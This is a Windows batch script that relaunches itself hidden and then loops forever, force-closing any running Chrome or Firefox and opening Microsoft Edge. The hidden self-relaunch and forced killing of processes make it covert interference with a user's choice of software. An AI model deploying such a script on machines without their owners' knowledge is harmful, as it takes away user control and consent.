@echo off
if "%1" neq "hidden" (
    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

setlocal

rem Paths to Edge
set "EDGE_PATH1=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
set "EDGE_PATH2=C:\Program Files\Microsoft\Edge\Application\msedge.exe"

:loop
rem Check if Chrome is running
tasklist /FI "IMAGENAME eq chrome.exe" | find /I "chrome.exe" >nul
set "CHROME_ACTIVE=%ERRORLEVEL%"

rem Check if Firefox is running
tasklist /FI "IMAGENAME eq firefox.exe" | find /I "firefox.exe" >nul
set "FIREFOX_ACTIVE=%ERRORLEVEL%"

rem Check if Edge window is visible
powershell -command "$edgeWindow = Get-Process msedge -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 }; if ($edgeWindow) { exit 0 } else { exit 1 }"
set "EDGE_VISIBLE=%ERRORLEVEL%"

rem If Chrome is running, close it
if %CHROME_ACTIVE%==0 (
    echo Chrome detected. Closing...
    taskkill /F /IM chrome.exe >nul 2>&1
)

rem If Firefox is running, close it
if %FIREFOX_ACTIVE%==0 (
    echo Firefox detected. Closing...
    taskkill /F /IM firefox.exe >nul 2>&1
)

rem If BOTH Chrome and Firefox are NOT running AND Edge is NOT visible, launch Edge
if %CHROME_ACTIVE%==1 if %FIREFOX_ACTIVE%==1 if %EDGE_VISIBLE%==1 (
    echo Launching Edge...
    if exist "%EDGE_PATH1%" (
        start "" "%EDGE_PATH1%" --new-window
    ) else if exist "%EDGE_PATH2%" (
        start "" "%EDGE_PATH2%" --new-window
    ) else (
        echo ERROR: Edge not found.
    )
)

rem Wait 5 seconds before checking again
timeout /t 2 >nul
goto loop
